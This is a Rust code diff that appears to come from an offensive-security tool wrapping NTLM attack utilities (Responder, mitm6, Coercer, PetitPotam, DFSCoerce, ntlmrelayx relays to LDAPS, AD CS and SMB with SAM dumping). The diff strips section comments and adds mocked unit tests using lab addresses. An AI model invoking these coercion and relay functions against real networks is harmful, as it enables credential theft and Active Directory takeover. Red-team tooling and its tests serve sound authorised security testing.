@@ -12,10 +12,6 @@ use crate::args::{optional_bool, optional_str, required_str};
 use crate::executor::CommandBuilder;
 use crate::ToolOutput;
 
-// ---------------------------------------------------------------------------
-// 1. Responder
-// ---------------------------------------------------------------------------
-
 /// Start Responder on a network interface to capture NTLM hashes.
 ///
 /// Optional args: `interface` (default "eth0"), `analyze_mode`
@@ -30,10 +26,6 @@ pub async fn start_responder(args: &Value) -> Result<ToolOutput> {
         .execute()
         .await
 }
-
-// ---------------------------------------------------------------------------
-// 2. mitm6
-// ---------------------------------------------------------------------------
 
 /// Start mitm6 to perform IPv6 DNS takeover for NTLM relay.
 ///
@@ -50,10 +42,6 @@ pub async fn start_mitm6(args: &Value) -> Result<ToolOutput> {
         .execute()
         .await
 }
-
-// ---------------------------------------------------------------------------
-// 3. Coercer (generic)
-// ---------------------------------------------------------------------------
 
 /// Coerce NTLM authentication from a target using all known protocols.
 ///
@@ -84,10 +72,6 @@ pub async fn coercer(args: &Value) -> Result<ToolOutput> {
 
     cmd.execute().await
 }
-
-// ---------------------------------------------------------------------------
-// 4. PetitPotam (MS-EFSR coercion)
-// ---------------------------------------------------------------------------
 
 /// Coerce NTLM authentication via MS-EFSR (PetitPotam).
 ///
@@ -120,10 +104,6 @@ pub async fn petitpotam(args: &Value) -> Result<ToolOutput> {
     cmd.execute().await
 }
 
-// ---------------------------------------------------------------------------
-// 5. DFSCoerce
-// ---------------------------------------------------------------------------
-
 /// Coerce NTLM authentication via MS-DFSNM (DFSCoerce).
 ///
 /// Required args: `target`, `listener`
@@ -153,10 +133,6 @@ pub async fn dfscoerce(args: &Value) -> Result<ToolOutput> {
     cmd.execute().await
 }
 
-// ---------------------------------------------------------------------------
-// 6. ntlmrelayx to LDAPS
-// ---------------------------------------------------------------------------
-
 /// Relay captured NTLM authentication to LDAPS for delegation abuse.
 ///
 /// Required args: `dc_ip`
@@ -174,10 +150,6 @@ pub async fn ntlmrelayx_to_ldaps(args: &Value) -> Result<ToolOutput> {
         .execute()
         .await
 }
-
-// ---------------------------------------------------------------------------
-// 7. ntlmrelayx to AD CS
-// ---------------------------------------------------------------------------
 
 /// Relay captured NTLM authentication to AD CS web enrollment.
 ///
@@ -198,10 +170,6 @@ pub async fn ntlmrelayx_to_adcs(args: &Value) -> Result<ToolOutput> {
         .await
 }
 
-// ---------------------------------------------------------------------------
-// 8. ntlmrelayx to SMB
-// ---------------------------------------------------------------------------
-
 /// Relay captured NTLM authentication to SMB on a target.
 ///
 /// Required args: `target_ip`
@@ -219,10 +187,6 @@ pub async fn ntlmrelayx_to_smb(args: &Value) -> Result<ToolOutput> {
         .execute()
         .await
 }
-
-// ---------------------------------------------------------------------------
-// 9. ntlmrelayx multi-relay
-// ---------------------------------------------------------------------------
 
 /// Relay captured NTLM authentication to multiple targets.
 ///
@@ -260,4 +224,136 @@ pub async fn ntlmrelayx_multirelay(args: &Value) -> Result<ToolOutput> {
     cmd = cmd.arg_if(dump_sam, "--dump-sam");
 
     cmd.execute().await
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::executor::mock;
+    use serde_json::json;
+
+    #[tokio::test]
+    async fn start_responder_executes() {
+        mock::push(mock::success());
+        let args = json!({});
+        assert!(start_responder(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn start_responder_analyze_mode() {
+        mock::push(mock::success());
+        let args = json!({"interface": "eth1", "analyze_mode": true});
+        assert!(start_responder(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn start_mitm6_executes() {
+        mock::push(mock::success());
+        let args = json!({"domain": "contoso.local"});
+        assert!(start_mitm6(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn coercer_executes() {
+        mock::push(mock::success());
+        let args = json!({"target": "192.168.58.1", "listener": "192.168.58.5"});
+        assert!(coercer(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn coercer_with_creds_executes() {
+        mock::push(mock::success());
+        let args = json!({
+            "target": "192.168.58.1", "listener": "192.168.58.5",
+            "username": "admin", "password": "P@ss", "domain": "contoso.local"
+        });
+        assert!(coercer(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn petitpotam_executes() {
+        mock::push(mock::success());
+        let args = json!({"target": "192.168.58.1", "listener": "192.168.58.5"});
+        assert!(petitpotam(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn petitpotam_with_creds_executes() {
+        mock::push(mock::success());
+        let args = json!({
+            "target": "192.168.58.1", "listener": "192.168.58.5",
+            "username": "admin", "password": "P@ss", "domain": "contoso.local"
+        });
+        assert!(petitpotam(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn dfscoerce_executes() {
+        mock::push(mock::success());
+        let args = json!({"target": "192.168.58.1", "listener": "192.168.58.5"});
+        assert!(dfscoerce(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn ntlmrelayx_to_ldaps_executes() {
+        mock::push(mock::success());
+        let args = json!({"dc_ip": "192.168.58.1"});
+        assert!(ntlmrelayx_to_ldaps(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn ntlmrelayx_to_ldaps_delegate_access() {
+        mock::push(mock::success());
+        let args = json!({"dc_ip": "192.168.58.1", "delegate_access": true});
+        assert!(ntlmrelayx_to_ldaps(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn ntlmrelayx_to_adcs_executes() {
+        mock::push(mock::success());
+        let args = json!({"ca_host": "ca01.contoso.local"});
+        assert!(ntlmrelayx_to_adcs(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn ntlmrelayx_to_adcs_with_template() {
+        mock::push(mock::success());
+        let args = json!({"ca_host": "ca01.contoso.local", "template": "User"});
+        assert!(ntlmrelayx_to_adcs(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn ntlmrelayx_to_smb_executes() {
+        mock::push(mock::success());
+        let args = json!({"target_ip": "192.168.58.1"});
+        assert!(ntlmrelayx_to_smb(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn ntlmrelayx_to_smb_with_socks() {
+        mock::push(mock::success());
+        let args = json!({"target_ip": "192.168.58.1", "socks": true, "interactive": true});
+        assert!(ntlmrelayx_to_smb(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn ntlmrelayx_multirelay_with_targets_file() {
+        mock::push(mock::success());
+        let args = json!({"targets_file": "/tmp/targets.txt"});
+        assert!(ntlmrelayx_multirelay(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn ntlmrelayx_multirelay_with_target_ips() {
+        mock::push(mock::success());
+        let args = json!({"target_ips": "192.168.58.1,192.168.58.2", "dump_sam": true});
+        assert!(ntlmrelayx_multirelay(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn ntlmrelayx_multirelay_no_targets() {
+        mock::push(mock::success());
+        let args = json!({});
+        assert!(ntlmrelayx_multirelay(&args).await.is_ok());
+    }
 }
